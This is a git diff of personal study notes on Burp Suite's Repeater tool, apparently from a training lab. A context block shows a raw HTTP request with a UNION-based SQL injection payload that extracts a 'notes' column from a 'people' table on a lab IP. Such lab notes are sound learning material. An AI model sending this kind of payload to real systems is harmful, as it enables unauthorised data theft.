@@ -1,5 +1,7 @@
 # Burp Suite: *Repeater*
 
+### [GO BACK](./intro.md)
+
 > Burp Suite Repeater allows us to craft and/or relay intercepted requests to a target at will.
 
 - CAPTURE reqeusts via proxy
@@ -47,6 +49,8 @@ Connection: close
 Upgrade-Insecure-Requests: 1
 
 
+```
+```HTTP
 # extracting payload
 GET /about/-1 UNION ALL SELECT notes, null, null, null, null FROM people where id=1 HTTP/1.1
 Host: 10.10.175.176
@@ -60,7 +64,7 @@ Upgrade-Insecure-Requests: 1
 
 ```
 
-> Personal note: Could have exeuted this via Postman as well
+> Personal note: Could have executed this via Postman as well. Infact it's more suited for the task, if not for proxied captures within it...
 
 ### Further studies
 
